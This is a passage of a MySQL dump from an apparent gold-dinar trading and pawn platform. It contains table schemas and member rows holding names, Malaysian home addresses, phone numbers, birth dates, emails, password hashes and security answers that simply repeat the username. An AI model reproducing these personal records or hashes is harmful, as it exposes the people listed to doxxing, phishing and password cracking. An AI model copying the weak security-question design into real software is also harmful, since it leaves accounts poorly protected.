(36, 'default-img.jpg', 'Mohd Kamarul', 'Mohd Mustafa', 'alon', '$2a$08$Gpr/yiADuk0E9FUi/q2oFePZlGv8H/ZksNKIXjibsDpv80Tygn9X.', 'What is my username?', 'alon', 'd4b9967b6c3f9cdb6210cb408e82a5be', '190 Taman Nakishah, Jalan Datuk Kumbar', 'Alor Setar', 'Kedah', '05450', 'Malaysia', '190 Taman Nakishah, Jalan Datuk Kumbar', 'Alor Setar', 'Kedah', '05450', 'Malaysia', NULL, NULL, '0193902805', '1980-05-28', NULL, NULL, NULL, 'Kamarul Mustafa', 'KamarulMustafa', 'alonthegreat', '', '0193902805', '', '', 'alonthegreat@gmail.com', '2016-04-24 14:55:26', 1, 2, '2016-04-25T10:39:12+08:00', '7fee64c2276e0d711cca8555c0d4c4f1', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(37, 'default-img.jpg', 'dinarfast', 'dinarfast', 'dinarfast', '$2a$08$USJ7Syj8MO.MvYL0tM5SWeKFaG/CX0QtyqyJXHOS5r0zS0ZmahsoO', 'What is my username?', 'dinarfast', '74700f94c74141db6bfea070ca7cefe6', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'hangatt@gmail.com', '2016-04-24 16:32:40', 1, 2, '2016-04-24T16:44:43+08:00', '2d18eb09212689ab24054f7f355a47d1', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(38, 'default-img.jpg', 'adleefx', 'adleefx', 'adleefx', '$2a$08$KGBMdZhKflLws/Aqch.eX.2vjMp./SZvIOmfcLYqY2rMQXN4NZdca', 'What is my username?', 'adleefx', 'ddd509ac76d2ff1bb4332edad9443f11', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'adleefx@gmail.com', '2016-04-24 16:35:28', 2, 2, '2016-04-24T16:36:21+08:00', 'b6dda70100517d946bb0811b45bd205c', 3, 1, 'Onlinebiz Trading', 'MY123', NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(40, '56690b07231e2711e2dcf3de1862be8a.jpeg', 'Mohammad imaduddin', 'Md Parid', 'bangtih82', '$2a$08$qvxAaI5SBaOIBdhlNkupx./Uz3otcdW0o.eVxRX.FspW01e7e5WS6', 'What is my username?', 'bangtih82', '4a39d4d40bd3ba6e588af660104fae12', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '+60164302100', '1982-03-28', NULL, NULL, NULL, '', '', '', '', '', '', '', 'doodey5329@gmail.com', '2016-04-24 17:17:52', 1, 2, '2016-04-24T20:04:24+08:00', '1e3c9532960fe3f4ba4941619f117d3d', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(41, 'default-img.jpg', 'mreduans', 'mreduans', 'mreduans', '$2a$08$EH3KuZDEIq/gNf2.7v4xXObIzISSQxzsF4fE1KogRopLfzXQIM4sy', 'What is my username?', 'mreduans', '3dcf1b626da49ed54ad543a61a63310c', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'mreduans@usm.my', '2016-04-24 19:28:21', 1, 2, '2016-04-24T19:29:20+08:00', '9945ace331d44cb489c53bc4423d86cd', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(42, 'default-img.jpg', 'icexnine', 'icexnine', 'icexnine', '$2a$08$M5CPy5grrpCZV04Z5aunDOth9pWKVptGs8vLrrjjtvg6b6sq6ggd6', 'What is my username?', 'icexnine', 'd25479cff6134cc598d74b881e56eaa3', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'icexnine@gmail.com', '2016-04-25 10:11:41', 1, 2, '2016-04-25T10:13:02+08:00', 'ddcae5b736dea6ee803f731f4d6629f3', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(43, '0', 'F800gs', 'F800gs', 'F800gs', '$2a$08$F1cDovZP/um2WmehBmwP/.7Sk8pxb4iUIVNUVborVcibOvw.Y7YpO', 'What is my username?', 'F800gs', '22f740dd2147dea0c24191a627e9534b', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'bakhtiar15@yahoo.com', '2016-04-25 12:25:00', 1, 2, '2016-04-25T12:26:45+08:00', 'cd6ddfe3044d1852d085ebceef2307ef', 3, 1, NULL, NULL, '0', 1, '0', 1, 'NU', 0, 0, 'no'),
(44, 'default-img.jpg', 'ansarbintulu', 'ansarbintulu', 'ansarbintulu', '$2a$08$PLJ.TgAFbfGEat/pQgtJb.Ab1eKNAtF8hB901iPtyEd/vL5SfZEVC', 'What is my username?', 'ansarbintulu', 'c665b9a2c574c66d6aa2ba8eb7f69a6f', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'borhanudin.hamdan@gmail.com', '2016-04-25 13:31:08', 1, 2, '2016-04-25T13:36:15+08:00', '5868016fbe198de240ab11fa46a11066', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(45, '0', 'fxbitlab', 'fxbitlab', 'fxbitlab', '$2a$08$XkiK8qQOZm60ELQYaisfP.q4/JPDhTsHaZ4FF/avA3aSRnzJdjOGi', 'What is my username?', 'fxbitlab', 'b8a3efe6030016d0dbc6188d483d6b6b', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'fxbitlab@gmail.com', '2016-04-25 22:47:21', 1, 2, '2016-04-25T22:48:08+08:00', '558ac876a767de05d3c2c071493a9fee', 3, 1, NULL, NULL, '0', 1, '0', 1, 'NU', 0, 0, 'no'),
(46, 'default-img.jpg', 'rizalrahim', 'rizalrahim', 'rizalrahim', '$2a$08$7CAl6sa0eUxT990pEBQRS.txaGVSjoc01IXFAF9J6ZhypamNKL9T6', 'What is my username?', 'rizalrahim', '36e46e675367bc7cdad4d2f7082570fb', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'rizal.rahim82@gmail.com', '2016-04-26 15:06:02', 1, 2, '2016-04-26T15:10:18+08:00', 'dbaa0075e9d6042526b30088621e66cf', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(47, 'default-img.jpg', 'Azhar9751', 'Azhar9751', 'Azhar9751', '$2a$08$DbW54Q231FxR6lqkCApuLO/89Y5UAhBef9QSSeq2/rbftCmhRhmZS', 'What is my username?', 'Azhar9751', '033ed15796968126a1ef11da142912a6', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'azhar29066@gmail.com', '2016-04-26 21:01:27', 1, 2, '2016-04-29T07:43:14+08:00', '9a5749634c226c2629c9d3e3d217bb2f', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(48, 'default-img.jpg', 'pu3pqin', 'pu3pqin', 'pu3pqin', '$2a$08$1ZeCsBI.wDBZwX88EoyALOqcJl0HeeqX.9ls./9XKHNomuYuw0DLa', 'What is my username?', 'pu3pqin', '9e7238e5f47e44c06c364ef6fa1f2b45', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'rajaputerishafiqkin@gmail.com', '2016-04-26 21:07:27', 1, 1, NULL, 'e28d9e435701110c18e0d68d9bb92188', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(49, 'default-img.jpg', 'umaq3', 'umaq3', 'umaq3', '$2a$08$HQh4GcXVhnF9HLg.J4uAc.lsbfXddk75aYHyB4XnaIFYCCwWY2/cy', 'What is my username?', 'umaq3', '3592a0090cb0614b40376a8a9f1af3fc', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'omar.mpputem1415@gmail.com', '2016-04-27 03:51:50', 1, 2, '2016-04-27T03:52:22+08:00', 'ddc465ad709d78dd1c683efa38ed7f94', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(50, 'ac65265d966ba36e0321a6e0e322e74b.jpeg', 'Aizuddin ', 'Zulkafli ', 'donbara87', '$2a$08$RIjtATpyJVD8bmEOvkmQi.8.7lyj/z6.ma5EYFbXul8YqzVDPCEXa', 'What is my username?', 'donbara87', '2c23e362eaa4ad718167eb637387f982', '', '', '', '', '', '', '', '', '', '', NULL, NULL, '0133884444', '1987-07-13', NULL, NULL, NULL, '', '', '', '', '', '', '', 'aizuddin.zulkafli@gmail.com', '2016-04-27 14:43:36', 1, 2, '2016-04-27T14:44:22+08:00', 'e37ab5bc3577a81c33f5fbb88fbda974', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 1, 'no'),
(51, 'default-img.jpg', 'AmiraAzhar', 'AmiraAzhar', 'AmiraAzhar', '$2a$08$JSrxaC2YbQMQgdps5qo8.OBzprs/Dfc3k3VT5gIKnQcyz1AQSz.2.', 'What is my username?', 'AmiraAzhar', '9c4a5168b969bc9e4415ffa09dd74354', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'missaa112@yahoo.com', '2016-04-27 22:22:11', 1, 2, '2016-04-27T22:28:29+08:00', 'dde6f8f596d49605fe585d623fcb1a41', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(52, 'default-img.jpg', 'AliaAzhar', 'AliaAzhar', 'AliaAzhar', '$2a$08$AXuJ3JfT8qTzjp22p7cPg.rpd1RxV132DWibJwrfHVLTV63CVRAIq', 'What is my username?', 'AliaAzhar', 'e1dc12ebb8e7905acf59d6ae6856f946', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'alia.azhar@outlook.com', '2016-04-28 13:20:59', 1, 2, '2016-04-28T13:21:43+08:00', '7437f13378fc32cfd346201b2f0aa3e3', 3, 1, NULL, NULL, NULL, 1, NULL, 1, 'NU', 0, 0, 'no'),
(54, '3ccd0fa92bd651e88aca13c10435785c.jpg', 'Shafira', 'Fatihah', 'Shafira1609', '$2a$08$PRv8BVyuM2EQrFX/mRJceO6FAveQCknilrHWGfGZgYCS6TWCt4pEO', 'What is my username?', 'Shafira1609', '3408eb5ace21bfc89dab4656b8e001b3', 'no 1 felda bukit bading', 'kuala terengganu', 'malaysia', '21810', 'terengganu', 'no 1 felda bukit bading', 'kuala terengganu', 'malaysia', '21810', 'terengganu', NULL, NULL, '0136331420', '1992-09-16', NULL, NULL, NULL, '- Nur Shafira Fatihah - ', '-', '-', '-', '0136331420', '0136331420', '-', 'shafira_fatihah09@yahoo.com', '2016-04-29 11:41:23', 1, 2, '2016-04-29T12:42:49+08:00', '08b8c8a50c943da7df70c8bbe9ba0c22', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 2, 'no'),
(55, '20833ca82753ad584404d496b3342951.jpg', 'siti zulaikha', 'abdullah', 'zulaikha', '$2a$08$0bZt5au8sc1D7FjOhNpXxuEvRnXHLNfnnlhnLqCDIozlDpwcGP9Cq', 'What is my username?', 'zulaikha', '7e56f1b04034c2ee0104f44efa7c96f4', '600-6 Batu 2 1/2 Padang Temu', 'Melaka', 'Melaka', '75050', 'Malaysia', '600-6 Batu 2 1/2 Padang Temu', 'Melaka', 'Melaka', '75050', 'Malaysia', NULL, NULL, '0136720330', '1993-04-07', NULL, NULL, NULL, 'zulaikhaabdullah75@gmail.com', '', 'mawaddah_alzahrah', '', '0136720330', '', '', 'zulaikhaabdullah75@gmail.com', '2016-04-29 11:53:29', 1, 2, '2016-04-29T11:56:28+08:00', '968b1b6bdc426e86092695466c3ae464', 3, 1, '', '', '', 1, '', 1, 'NU', 0, 2, 'no');

-- --------------------------------------------------------

--
-- Table structure for table `members_activation_status`
--

CREATE TABLE IF NOT EXISTS `members_activation_status` (
  `mas_id` int(11) NOT NULL AUTO_INCREMENT,
  `mas_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`mas_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `members_activation_status`
--

INSERT INTO `members_activation_status` (`mas_id`, `mas_desc`) VALUES
(1, 'Unverified E-mail'),
(2, 'Basic Account'),
(3, 'Account Verified'),
(4, 'Account Deactivated');

-- --------------------------------------------------------

--
-- Table structure for table `members_level`
--

CREATE TABLE IF NOT EXISTS `members_level` (
  `ml_id` int(11) NOT NULL AUTO_INCREMENT,
  `ml_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`ml_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `members_level`
--

INSERT INTO `members_level` (`ml_id`, `ml_desc`) VALUES
(1, 'Administrator'),
(2, 'Staff'),
(3, 'Members');

-- --------------------------------------------------------

--
-- Table structure for table `members_status`
--

CREATE TABLE IF NOT EXISTS `members_status` (
  `ms_id` int(11) NOT NULL AUTO_INCREMENT,
  `ms_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`ms_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `members_status`
--

INSERT INTO `members_status` (`ms_id`, `ms_desc`) VALUES
(1, 'Active'),
(2, 'Inactive');

-- --------------------------------------------------------

--
-- Table structure for table `members_type`
--

CREATE TABLE IF NOT EXISTS `members_type` (
  `mt_id` int(11) NOT NULL AUTO_INCREMENT,
  `mt_code` varchar(20) NOT NULL,
  `mt_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`mt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `members_type`
--

INSERT INTO `members_type` (`mt_id`, `mt_code`, `mt_desc`) VALUES
(1, 'NU', 'Normal User'),
(2, 'DP', 'Dinarpal System'),
(3, 'GA', 'God Admin');

-- --------------------------------------------------------

--
-- Table structure for table `members_verification`
--

CREATE TABLE IF NOT EXISTS `members_verification` (
  `mv_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `mv_govissueid` varchar(200) DEFAULT NULL,
  `mvs_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`mv_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `members_verification_status`
--

CREATE TABLE IF NOT EXISTS `members_verification_status` (
  `mvs_id` int(11) NOT NULL AUTO_INCREMENT,
  `mvs_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`mvs_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `members_verification_status`
--

INSERT INTO `members_verification_status` (`mvs_id`, `mvs_desc`) VALUES
(1, 'Unverified'),
(2, 'Verified'),
(3, 'Accepted'),
(4, 'Rejected');

-- --------------------------------------------------------

--
-- Table structure for table `merchant`
--

CREATE TABLE IF NOT EXISTS `merchant` (
  `mer_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `bap_id` int(11) NOT NULL,
  `mer_address` varchar(200) NOT NULL,
  `at_id` int(11) NOT NULL,
  `mer_contact` varchar(200) NOT NULL,
  `mer_agree` varchar(200) NOT NULL,
  `mer_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`mer_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pawn`
--

CREATE TABLE IF NOT EXISTS `pawn` (
  `pa_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `pa_start_date` datetime NOT NULL,
  `pa_end_date` datetime NOT NULL,
  `am_id` int(11) NOT NULL,
  `pa_total_weight` varchar(200) DEFAULT '0',
  `pa_grand_total` varchar(200) DEFAULT '0',
  `pa_rahnu_rate` varchar(200) DEFAULT '0',
  `pa_pay_loan` varchar(200) DEFAULT '0',
  `pa_safe_fee` varchar(200) DEFAULT '0',
  `pt_id` int(11) NOT NULL COMMENT 'pawn_type',
  `sl_id` int(11) NOT NULL,
  `pa_status` int(11) DEFAULT '1',
  `pa_tracking` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`pa_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pawn_child`
--

CREATE TABLE IF NOT EXISTS `pawn_child` (
  `pc_id` int(11) NOT NULL AUTO_INCREMENT,
  `pa_id` int(11) NOT NULL,
  `pc_qty` varchar(200) DEFAULT '0',
  `pc_status` int(11) DEFAULT '1',
  `vp_id` int(11) DEFAULT '0',
  PRIMARY KEY (`pc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pawn_child_child`
--

CREATE TABLE IF NOT EXISTS `pawn_child_child` (
  `pcc_id` int(11) NOT NULL AUTO_INCREMENT,
  `pc_id` int(11) NOT NULL,
  `pcc_image` varchar(500) NOT NULL,
  `pcc_datetime` datetime NOT NULL,
  `pcc_price` varchar(200) NOT NULL DEFAULT '0',
  `pcc_fee` varchar(200) NOT NULL DEFAULT '0',
  `pcc_status` int(11) DEFAULT '1',
  PRIMARY KEY (`pcc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `pawn_status`
--

CREATE TABLE IF NOT EXISTS `pawn_status` (
  `ps_id` int(11) NOT NULL AUTO_INCREMENT,
  `ps_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`ps_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `pawn_status`
--

INSERT INTO `pawn_status` (`ps_id`, `ps_desc`) VALUES
(1, 'Successful'),
(2, 'Pending'),
(3, 'Redeemed');

-- --------------------------------------------------------

--
-- Table structure for table `pawn_type`
--

CREATE TABLE IF NOT EXISTS `pawn_type` (
  `pt_id` int(11) NOT NULL AUTO_INCREMENT,
  `pt_code` varchar(200) NOT NULL,
  `pt_name` varchar(200) NOT NULL,
  PRIMARY KEY (`pt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `pawn_type`
--

INSERT INTO `pawn_type` (`pt_id`, `pt_code`, `pt_name`) VALUES
(1, 'PP', 'Purchase and Pawn'),
(2, 'PC', 'Pawn and Courier');

-- --------------------------------------------------------

--
-- Table structure for table `payment_method`
--

CREATE TABLE IF NOT EXISTS `payment_method` (
  `pm_id` int(11) NOT NULL AUTO_INCREMENT,
  `pm_name` varchar(200) NOT NULL,
  PRIMARY KEY (`pm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `payment_method`
--

INSERT INTO `payment_method` (`pm_id`, `pm_name`) VALUES
(1, 'E-Dinar Balance');

-- --------------------------------------------------------

--
-- Table structure for table `payment_type`
--

CREATE TABLE IF NOT EXISTS `payment_type` (
  `pt_id` int(11) NOT NULL AUTO_INCREMENT,
  `pt_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`pt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `payment_type`
--

INSERT INTO `payment_type` (`pt_id`, `pt_desc`) VALUES
(1, 'Goods'),
(2, 'Services');

-- --------------------------------------------------------

--
-- Table structure for table `purity`
--

CREATE TABLE IF NOT EXISTS `purity` (
  `pu_id` int(11) NOT NULL AUTO_INCREMENT,
  `pu_desc` varchar(20) NOT NULL,
  PRIMARY KEY (`pu_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=7 ;

--
-- Dumping data for table `purity`
--

INSERT INTO `purity` (`pu_id`, `pu_desc`) VALUES
(1, '999'),
(2, '950'),
(3, '916'),
(4, '875'),
(5, '835'),
(6, '750');

-- --------------------------------------------------------

--
-- Table structure for table `sellbuy_board`
--

CREATE TABLE IF NOT EXISTS `sellbuy_board` (
  `sb_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) DEFAULT NULL,
  `sb_date` datetime DEFAULT NULL,
  `sbt_id` int(11) DEFAULT NULL,
  `it_id` int(11) DEFAULT NULL,
  `sb_weight` varchar(200) DEFAULT '0',
  `sb_pricepergram` varchar(200) DEFAULT '0',
  `sb_notes` varchar(500) DEFAULT NULL,
  `sb_whatsapp` varchar(200) DEFAULT NULL,
  `sbs_id` int(11) DEFAULT '1',
  PRIMARY KEY (`sb_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `sellbuy_board_status`
--

CREATE TABLE IF NOT EXISTS `sellbuy_board_status` (
  `sbs_id` int(11) NOT NULL AUTO_INCREMENT,
  `sbs_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`sbs_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `sellbuy_board_status`
--

INSERT INTO `sellbuy_board_status` (`sbs_id`, `sbs_desc`) VALUES
(1, 'Open'),
(2, 'Closed');

-- --------------------------------------------------------

--
-- Table structure for table `sellbuy_board_type`
--

CREATE TABLE IF NOT EXISTS `sellbuy_board_type` (
  `sbt_id` int(11) NOT NULL AUTO_INCREMENT,
  `sbt_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`sbt_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `sellbuy_board_type`
--

INSERT INTO `sellbuy_board_type` (`sbt_id`, `sbt_desc`) VALUES
(1, 'Buy'),
(2, 'Sell'),
(3, 'Swap'),
(4, 'Other');

-- --------------------------------------------------------

--
-- Table structure for table `send_payment_gram`
--

CREATE TABLE IF NOT EXISTS `send_payment_gram` (
  `spg_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id_to` int(11) NOT NULL,
  `me_id_from` int(11) NOT NULL,
  `pt_id` int(11) NOT NULL,
  `at_id` int(11) NOT NULL,
  `v_id` int(11) NOT NULL,
  `spg_notes` varchar(500) NOT NULL,
  `tr_id` int(11) NOT NULL,
  `spg_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`spg_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `souq`
--

CREATE TABLE IF NOT EXISTS `souq` (
  `so_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) DEFAULT NULL,
  `so_buy_date` datetime DEFAULT NULL,
  `am_id` int(11) DEFAULT NULL,
  `so_total_weight` varchar(200) DEFAULT '0',
  `so_grand_total` varchar(200) DEFAULT '0',
  `sl_id` int(11) DEFAULT '0',
  `so_address` varchar(500) DEFAULT '-',
  `so_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`so_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `souq`
--

INSERT INTO `souq` (`so_id`, `me_id`, `so_buy_date`, `am_id`, `so_total_weight`, `so_grand_total`, `sl_id`, `so_address`, `so_status`) VALUES
(1, 50, '2016-04-27 15:06:24', 1, '1', '200', 1, '-', 1);

-- --------------------------------------------------------

--
-- Table structure for table `souq_adc`
--

CREATE TABLE IF NOT EXISTS `souq_adc` (
  `sadc_id` int(11) NOT NULL AUTO_INCREMENT,
  `so_id` int(11) NOT NULL,
  `adc_id` int(11) NOT NULL,
  `sadc_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`sadc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `souq_child`
--

CREATE TABLE IF NOT EXISTS `souq_child` (
  `sc_id` int(11) NOT NULL AUTO_INCREMENT,
  `so_id` int(11) NOT NULL,
  `v_id` int(11) NOT NULL,
  `sc_qty` varchar(200) DEFAULT '0',
  `sc_status` int(11) DEFAULT '1',
  PRIMARY KEY (`sc_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `souq_child_child`
--

CREATE TABLE IF NOT EXISTS `souq_child_child` (
  `scc_id` int(11) NOT NULL AUTO_INCREMENT,
  `so_id` int(11) NOT NULL,
  `v_id` int(11) NOT NULL,
  `scc_datetime` datetime NOT NULL,
  `scc_fee` varchar(200) NOT NULL,
  `scc_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`scc_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `souq_child_child`
--

INSERT INTO `souq_child_child` (`scc_id`, `so_id`, `v_id`, `scc_datetime`, `scc_fee`, `scc_status`) VALUES
(1, 1, 1, '2016-04-27 15:06:24', '0', 1);

-- --------------------------------------------------------

--
-- Table structure for table `souq_ds`
--

CREATE TABLE IF NOT EXISTS `souq_ds` (
  `sds_id` int(11) NOT NULL AUTO_INCREMENT,
  `so_id` int(11) NOT NULL,
  `ds_id` int(11) NOT NULL,
  `sds_status` int(11) DEFAULT '1',
  PRIMARY KEY (`sds_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `storage_location`
--

CREATE TABLE IF NOT EXISTS `storage_location` (
  `sl_id` int(11) NOT NULL AUTO_INCREMENT,
  `sl_name` varchar(200) NOT NULL,
  `sl_address` varchar(500) DEFAULT NULL,
  `sl_code` varchar(20) NOT NULL,
  PRIMARY KEY (`sl_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `storage_location`
--

INSERT INTO `storage_location` (`sl_id`, `sl_name`, `sl_address`, `sl_code`) VALUES
(1, 'Malaysia - Melaka - Melaka International Trade Centre', 'Lot X1, Depan Mydin MiTC Melaka, Bandar MiTC, 75450, Ayer Keroh, Melaka.', 'DPMY'),
(2, 'Brunei - Bandar Seri Begawan - Jalan Kucing', 'Bandar Brunei.', 'DPB'),
(3, 'UAE - Dubai - Gold Souk', 'Atas Bangunan Tertinggi di Dubai.', 'DPUAE');

-- --------------------------------------------------------

--
-- Table structure for table `transaction`
--

CREATE TABLE IF NOT EXISTS `transaction` (
  `tr_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id_from` int(11) NOT NULL,
  `me_id_to` int(11) NOT NULL,
  `tr_amount` varchar(200) DEFAULT '0',
  `pt_id` int(11) NOT NULL COMMENT 'payment_type',
  `at_id` int(11) NOT NULL,
  `ft_id` int(11) NOT NULL,
  `tr_notes` varchar(500) DEFAULT NULL,
  `tr_datetime` datetime NOT NULL,
  `bm_id` int(11) NOT NULL,
  `tt_id` int(11) NOT NULL,
  `ts_id` int(11) NOT NULL,
  `det_id` int(11) DEFAULT '0',
  `tr_deposit_code` varchar(200) DEFAULT NULL,
  `tr_file` varchar(500) NOT NULL,
  PRIMARY KEY (`tr_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=45 ;

--
-- Dumping data for table `transaction`
--

INSERT INTO `transaction` (`tr_id`, `me_id_from`, `me_id_to`, `tr_amount`, `pt_id`, `at_id`, `ft_id`, `tr_notes`, `tr_datetime`, `bm_id`, `tt_id`, `ts_id`, `det_id`, `tr_deposit_code`, `tr_file`) VALUES
(1, 1, 6, '17.12', 0, 1, 6, '', '2016-04-23 17:44:58', 0, 3, 5, 1, '9wjvGkOGvSwUAsAn', ''),
(2, 1, 7, '202.12', 0, 1, 6, 'fund for dinarpal<br /><br />Comment from admin:-<br />thanks', '2016-04-23 17:47:27', 0, 3, 1, 1, 'xsqf7oih5jE7NS4z', ''),
(3, 1, 26, '202.12', 0, 1, 6, '<br /><br />Comment from admin:-<br />approve demo deposit', '2016-04-23 22:35:34', 0, 3, 1, 1, 'k60b4ddH4rbft7XD', ''),
